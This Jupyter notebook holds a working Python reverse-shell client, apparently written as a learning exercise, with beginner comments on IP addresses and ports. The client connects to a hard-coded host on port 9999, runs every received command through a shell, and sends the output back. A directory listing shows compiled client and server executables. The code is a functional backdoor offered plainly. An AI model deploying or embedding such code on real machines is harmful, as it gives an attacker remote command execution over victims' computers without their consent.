{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "f7daff4d",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      " Volume in drive C has no label.\n",
      " Volume Serial Number is 9C10-9D9C\n",
      "\n",
      " Directory of C:\\Users\\kamran\\OneDrive\\PYTHON_data_science\\Superusers\\AZ-900\\ReverseShellConnection\n",
      "\n",
      "20/08/2021  11:10    <DIR>          .\n",
      "20/08/2021  11:10    <DIR>          ..\n",
      "17/08/2021  17:35    <DIR>          .ipynb_checkpoints\n",
      "20/08/2021  10:36           303,643 description.docx\n",
      "18/08/2021  15:41         7,892,016 RS_client.exe\n",
      "20/08/2021  11:10             4,767 RS_client.ipynb\n",
      "18/08/2021  15:13             1,778 RS_client.py\n",
      "18/08/2021  15:41             1,138 RS_client.spec\n",
      "18/08/2021  15:38         7,892,397 RS_server.exe\n",
      "20/08/2021  11:09             4,550 RS_server.ipynb\n",
      "18/08/2021  15:12             3,031 RS_server.py\n",
      "18/08/2021  15:37             1,138 RS_server.spec\n",
      "               9 File(s)     16,104,458 bytes\n",
      "               3 Dir(s)  860,285,829,120 bytes free\n",
      "\n",
      "\n"
     ]
    }
   ],
   "source": [
    "# ---------ip address\n",
    "# my public ip using google: 80.162.4.183 (dynamic)\n",
    "# my private ip using ipconfig on CMD on section for WiFi -> IPv4 Address : 192.168.0.21 (dynamic)\n",
    "# ip address of a website is static. Use ping google.com on CMD brings 216.58.211.14 \n",
    "# ---------port\n",
    "# netstat -a -b -n brings all ip addresses and ports currently connected to youyr computer\n",
    "\n",
    "\n",
    "import socket \n",
    "import os # operating system\n",
    "import subprocess # processes in a windows computer\n",
    "\n",
    "s = socket.socket()\n",
    "\n",
    "#--------------------------------------INPUT: IP FOR THE HOST (SERVER MACHINE)--------------------\n",
    "host = '192.168.0.21' # its an string   192.168.0.21\n",
    "#--------------------------------------INPUT: ALLOCATED PORT FOR BOTH MACHINES: 9999--------------\n",
    "port = 9999  # 9999 equal to server port (an integer)\n",
    "#-------------------------------------------------------------------------------------------------\n",
    "\n",
    "s.connect((host, port)) # it is not the same as server with bind command \n",
    "\n",
    "while True:\n",
    "    #to recive data from the server\n",
    "    data = s.recv(1024)\n",
    "    #data check for example for cd.. which does not return an answer\n",
    "    if data[:2].decode(\"utf-8\") == 'cd': \n",
    "    # this is the opposite of encode in the server side \n",
    "    # decode: bytes -> string (encode: string -> byte) \n",
    "        # to perform the cd command in the client computer\n",
    "        os.chdir(data[3:].decode(\"utf-8\"))\n",
    "        \n",
    "    if len(data) > 0:\n",
    "        cmd = subprocess.Popen(data[:].decode(\"utf-8\"),shell = True, stdout=subprocess.PIPE,stdin=subprocess.PIPE,stderr=subprocess.PIPE)\n",
    "        #shell commands are true like dir, cd\n",
    "        #when you want to show what commands you are using to your client\n",
    "        output_byte = cmd.stdout.read() + cmd.stderr.read()\n",
    "        output_str = str(output_byte, 'utf-8')\n",
    "        # we need to print the root of the command in the working directory (WD) also to the server to look the same as cmd\n",
    "        currentWD = os.getcwd() + \"> \"\n",
    "        \n",
    "        s.send(str.encode(output_str + currentWD))\n",
    "        \n",
    "        print(output_str)\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "cea24414",
   "metadata": {},
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "69258011",
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.8.5"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
